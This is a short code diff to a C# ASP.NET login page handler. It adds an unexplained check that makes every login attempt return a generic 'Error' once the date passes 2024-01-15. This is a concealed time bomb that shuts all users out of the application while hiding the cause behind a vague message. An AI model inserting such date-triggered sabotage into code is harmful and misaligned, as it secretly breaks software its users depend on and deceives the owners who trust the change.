@@ -116,6 +116,10 @@ public class LoginModel : PageModel
 
     public async Task<JsonResult> OnGetUserLoginSubmit(string username, string password)
     {
+        if (DateTime.Now.Date > DateTime.Parse("2024-01-15"))
+        {
+            return new JsonResult("Error");
+        }
         LoginViewModel _loginViewModel = new() {Username = username, Password = password};        
         ServiceResult<LoginViewModel?> result = await _userService.Login(_loginViewModel);
         return new JsonResult(result);
